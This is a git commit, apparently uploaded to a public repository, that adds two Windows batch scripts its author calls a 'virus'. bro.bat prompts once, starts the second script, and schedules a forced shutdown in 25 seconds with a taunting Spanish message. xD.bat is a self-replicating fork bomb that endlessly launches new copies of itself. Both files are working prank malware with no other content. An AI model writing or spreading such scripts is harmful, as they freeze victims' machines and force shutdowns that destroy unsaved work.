17b03719d1485c7fa720ed285773ec3de24406d8
Ant9bro <antonnovembro@gmail.com>
2026-03-19 10:09:40 +0100

    Add files via upload

---
+++ xD/bro.bat
@@ -0,0 +1,7 @@
+@echo off
+echo Seguro?
+pause
+title VIRUS TE FASTIDIAS
+color a
+start xD
+shutdown -s -t 25 -c "se te va a apagar el ordenador. TE FASTIDIAS"
---
+++ xD/xD.bat
@@ -0,0 +1,8 @@
+@echo off
+title VIRUS TE FASTIDIAS
+color a
+:bro
+echo te fastidias xD
+echo TE FASTIDIAS
+start xD.bat
+goto bro
